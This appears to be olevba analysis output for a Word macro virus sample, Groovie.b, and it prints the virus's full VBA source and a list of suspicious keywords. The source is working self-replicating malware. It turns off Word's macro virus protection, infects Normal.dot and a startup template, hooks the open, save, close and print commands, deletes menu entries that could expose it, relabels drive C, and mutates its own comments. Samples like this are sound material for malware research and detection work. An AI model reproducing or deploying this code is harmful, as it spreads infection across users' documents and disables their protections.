olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Groovie.b-5793b76f3dc23721213e168f4b65d32cdedb302f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Groovie.b-5793b76f3dc23721213e168f4b65d32cdedb302f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO groovie.bas 
in file: Virus.MSWord.Groovie.b-5793b76f3dc23721213e168f4b65d32cdedb302f - OLE stream: 'Macros/VBA/groovie'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Public I01 As String
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I02 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I03 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I04 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I05 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I06 As String
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I07 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Public I08 As Boolean
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I09()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If MacroContainer = NormalTemplate Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        I01 = "normal"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        GoTo checkout
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If MacroContainer = ActiveDocument Then I01 = "document"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If MacroContainer = "data.dot" Then I01 = "orbit"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
checkout:
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I10()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If Dir(Application.StartupPath + "\data.dot") = "data.dot" Then I02 = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    For I = 1 To ActiveDocument.VBProject.VBComponents.Count
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If ActiveDocument.VBProject.VBComponents(I).Name = "groovie" Then I04 = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Next I
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    For I = 1 To NormalTemplate.VBProject.VBComponents.Count
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If NormalTemplate.VBProject.VBComponents(I).Name = "groovie" Then I03 = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Next I
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If GetAttr(NormalTemplate.FullName) = vbArchive + vbReadOnly Or GetAttr(NormalTemplate.FullName) = vbReadOnly Then I05 = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I11()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Call I09
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Call I10
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I01 = "document" Then Call I12
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I01 = "normal" Then Call I13
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I01 = "orbit" Then Call I14
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Macro").Delete
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I05 = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I12()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Application.VBE.ActiveVBProject.VBComponents("groovie").Export "c:\groovie.sys"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I03 = False And I05 = False Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        With NormalTemplate.VBProject
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I02 = False Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Shell ("label c: groovie"), 0
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Windows(1).Close
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I13()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Application.ScreenUpdating = False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Call I17
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I04 = False And I07 = True Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        With ActiveDocument.VBProject
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        With .VBComponents.Import("c:\groovie.sys")
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        With Dialogs(wdDialogFileSummaryInfo)
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            .Comments = "ALT-F11 says it's groovie!"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            .Execute
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I02 = False And I07 = True Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If I08 = False Then Documents.Open FileName:=I06
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    If I02 = False And I07 = False Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Documents.Add Template:="", NewTemplate:=False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        ActiveDocument.SaveAs FileName:=Application.StartupPath + "\data.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Application.OrganizerRename Source:=Application.StartupPath + "\data.dot", Name:="groovie", NewName:="orbit", Object:=wdOrganizerObjectProjectItems
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If ActiveDocument.Saved = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        Windows(1).Close SaveChanges:=wdSaveChanges
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Application.ScreenUpdating = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I14()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Application.ScreenUpdating = False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If I03 = False And I05 = False Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            With NormalTemplate.VBProject
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            NormalTemplate.Save
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        If I04 = False Then
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            With ActiveDocument.VBProject
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            With .VBComponents.Import("c:\groovie.sys")
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            With Dialogs(wdDialogFileSummaryInfo)
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
                .Comments = "ALT-F11 says it's groovie!"
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
                .Execute
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
            End With
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
        End If
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Application.ScreenUpdating = True
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
Function I15()
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Options.VirusProtection = False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Options.SaveNormalPrompt = False
 ' OK6/7/98 1:07:21 PM422Me422HP LaserJet 4 on LPT1:
    Options.ConfirmConversions = False
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    I06 = ActiveDocument.FullName
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    Call I11
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub AutoOpen()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub AutoClose()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
I08 = True
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub AutoExit()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub FileSaveAs()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I16
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Dialogs(wdDialogFileSaveAs).Show
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub filesave()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I16
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub fileclose()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
I08 = True
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
ActiveDocument.Close
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub fileprint()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error Resume Next
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Call I15
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Dialogs(wdDialogFilePrint).Show
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub viewvbcode()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
MsgBox "It's GROOVIE", vbOKOnly, "•  ALT-F11  • says..."
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub ToolsMacro()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Sub FileTemplates()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Sub
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Function I17()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
On Error GoTo docek
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    If ActiveDocument.Name <> "" Then
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
        I07 = True
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    End If
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    GoTo over
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
docek:
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
    I07 = False
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
over:
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Function
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Function I16()
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Randomize
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
rn = Int(Rnd * 999)
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
With Application.VBE.ActiveVBProject.VBComponents("Groovie").CodeModule
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
For x = 2 To 358 Step 2
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
.DeleteLines x
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
.InsertLines x, " ' " & Application.UserInitials & Now & rn & Application.UserName & rn & Application.ActivePrinter
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
Next x
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End With
 ' OK6/7/98 1:07:22 PM422Me422HP LaserJet 4 on LPT1:
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

